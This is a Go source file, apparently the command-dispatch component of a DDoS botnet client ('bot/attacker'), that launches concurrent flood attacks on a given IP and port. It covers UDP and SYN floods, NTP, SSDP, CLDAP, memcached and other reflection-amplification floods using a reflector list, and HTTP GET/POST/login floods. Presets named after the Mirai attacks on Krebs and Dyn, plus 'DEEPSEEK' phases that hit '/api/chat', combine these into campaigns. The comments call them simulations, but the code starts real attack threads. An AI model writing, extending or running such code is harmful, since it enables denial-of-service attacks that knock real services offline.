package attacker

import (
	"bot/attacker/attack"
	"fmt"
	"log"
	"strings"
)

// stopChannelInitialized Global variable to confirm if the stop channel has been initialized
var stopChannelInitialized = false

// AttackInit Initialize attack
func AttackInit(method string, dstip string, dstport int, path string) {
	// Reinitialize the stop channel
	attack.ResetStopChannel()
	
	switch method {
	case "STOP":
		// Stop attack
		close(attack.STOP)
		log.Println("Stopped all attacks")
		return

	// Layer4 attacks
	case "UDP", "DNS", "DNSA", "SYN", "RDP", "CLDAP", "MEMCACHED", "ARD", "NTP", "SSDP", "CHARGEN", "SNMP", "QUIC", "OPENVPN", "TFTP", "DNSBOMB", "DNSBOOMERANG":
		attack4 := attack.Layer4{
			Method:      method,
			DstIP:       dstip,
			DstPort:     dstport,
			ThreadCount: 10,
			AmpFile:     "serverfile/reflector.txt",
		}
		
		// Custom parameters for specific attack methods
		if method == "DNS" || method == "DNSA" {
			attack4.Reservedfield = "example.com" // Default domain query
		}
		
		go attack4.StartAttack()

	// Layer7 attacks
	case "GET", "POST", "LOGIN", "COOKIE":
		target := formatTarget(dstip, dstport)
		attack7 := attack.HTTP{
			Method:    method,
			Target:    target,
			Threads:   10,
			Path:      path,
		}
		go attack7.HTTPStart()

	// Botnet simulation
	case "MIRAI_1": // Mirai botnet attack, using UDP and DNS flood. Simulates the attack on Krebs
		udp := attack.Layer4{
			Method:      "UDP",
			DstIP:       dstip,
			DstPort:     dstport,
			ThreadCount: 7,
			AmpFile:     "serverfile/reflector.txt",
		}
		dns := attack.Layer4{
			Method:      "DNS",
			DstIP:       dstip,
			DstPort:     dstport,
			ThreadCount: 2,
			AmpFile:     "serverfile/reflector.txt",
		}
		syn := attack.Layer4{
			Method:      "SYN",
			DstIP:       dstip,
			DstPort:     dstport,
			ThreadCount: 1,
			AmpFile:     "serverfile/reflector.txt",
		}
		go udp.StartAttack()
		go dns.StartAttack()
		go syn.StartAttack()

	case "MIRAI_2": // Mirai botnet attack, simulates the attack on Dyn
		syn := attack.Layer4{ 
			Method:      "SYN",
			DstIP:       dstip,
			DstPort:     dstport,
			ThreadCount: 3,
			AmpFile:     "serverfile/reflector.txt",
		}
		dns := attack.Layer4{
			Method:      "DNS",
			DstIP:       dstip,
			DstPort:     dstport,
			ThreadCount: 7,
			AmpFile:     "serverfile/reflector.txt",
		}
		go syn.StartAttack()
		go dns.StartAttack()

	case "DEEPSEEK_1": // Phase 1 NTP, SSDP, CLDAP reflection amplification
		ntp := attack.Layer4{
			Method:      "NTP",
			DstIP:       dstip,
			DstPort:     dstport,
			ThreadCount: 4,
			AmpFile:     "serverfile/reflector.txt",
		}
		ssdp := attack.Layer4{
			Method:      "SSDP",
			DstIP:       dstip,
			DstPort:     dstport,
			ThreadCount: 4,
			AmpFile:     "serverfile/reflector.txt",
		}
		cldap := attack.Layer4{
			Method:      "CLDAP",
			DstIP:       dstip,
			DstPort:     dstport,
			ThreadCount: 2,
			AmpFile:     "serverfile/reflector.txt",
		}
		go ntp.StartAttack()
		go ssdp.StartAttack()
		go cldap.StartAttack()
	case "DEEPSEEK_2": // Phase 2 HTTP attack
		target := formatTarget(dstip, dstport)
		// Check if path is empty, if so set it to "/api/chat"
		if path == "" {
			path = "/api/chat"
		}
		attack7 := attack.HTTP{
			Method:    method,
			Target:    target,
			Threads:   10,
			Path:      path,
		}
		go attack7.HTTPStart()

	default:
		log.Printf("Unknown attack method: %s", method)
	}
}

// Format target URL
func formatTarget(dstip string, dstport int) string {
	// Check if IP is already in URL format
	if strings.HasPrefix(dstip, "http://") || strings.HasPrefix(dstip, "https://") {
		// Already in URL format, return directly
		return dstip
	}
	
	// Construct basic HTTP URL
	return fmt.Sprintf("http://%s:%d", dstip, dstport)
}
